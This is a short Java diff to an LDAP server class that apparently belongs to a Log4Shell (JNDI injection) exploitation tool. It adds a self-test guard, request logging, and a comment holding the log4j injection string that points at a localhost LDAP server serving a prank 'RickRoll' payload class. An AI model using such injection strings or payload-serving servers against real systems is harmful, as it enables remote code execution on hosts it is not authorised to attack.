@@ -24,8 +24,13 @@ public class LDAPServer extends InMemoryOperationInterceptor {
     //to test thing
     public static void main(String[] args) {
         InitialDirContext idc = null;
+        //false positive check
+        if (LDAPServer.class.getClassLoader().getResource(Main.defaultPayload.replace('.', '/') + ".class") != null) {
+            throw new RuntimeException("payload already exists in current classloader");
+        }
         try {
             idc = new InitialDirContext();
+            //log4j: ${jndi:ldap://localhost:1389/o=reference,payload=itzbenz.payload.RickRoll}
             Object o = idc.lookup("ldap://localhost:1389/o=reference,payload=itzbenz.payload.RickRoll");
             System.out.println(o);
         } catch (Exception e) {
@@ -53,6 +58,8 @@ public class LDAPServer extends InMemoryOperationInterceptor {
     public void processSearchResult(InMemoryInterceptedSearchResult result) {
         String base = result.getRequest().getBaseDN();
         String payload = base.split(",")[1].split("=")[1];
+        System.out.println();
+        System.out.println("[+] Requested Payload: " + payload);
         if (!Main.payloadExists(payload))
             payload = Main.defaultPayload;
         String className = payload.split("\\.")[payload.split("\\.").length - 1];
